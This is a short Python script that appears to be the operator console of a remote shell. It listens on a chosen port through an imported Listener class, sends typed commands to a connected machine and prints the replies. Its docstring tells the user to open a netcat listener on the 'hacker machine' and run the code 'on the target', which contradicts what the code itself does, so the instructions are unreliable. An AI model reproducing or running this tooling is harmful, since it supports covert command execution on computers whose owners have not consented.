#!/usr/bin/env python3
'''
Do this on hacker machine:

nc -vv -l -p 4444
netcat verbose listen port 4444


Run this code on the target:

'''
import argparse
import socket
import subprocess
from listen import Listener

def get_arg(parser, flag, name, text):
    parser.add_argument("-" + flag, "--" + name, dest=name, help=text)
    return parser

parser = argparse.ArgumentParser()
parser = get_arg(parser, 'p', 'port', 'Port to listen to')
value = parser.parse_args()
port = value.port
listener = Listener(int(port))

cmd = input(">> ")
while True:
    listener.send_json(cmd)
    if "close" == cmd.strip():
        break
    reply = listener.recv_json(1024)
    print(reply.strip())
    cmd = input(">> ")
listener.close()




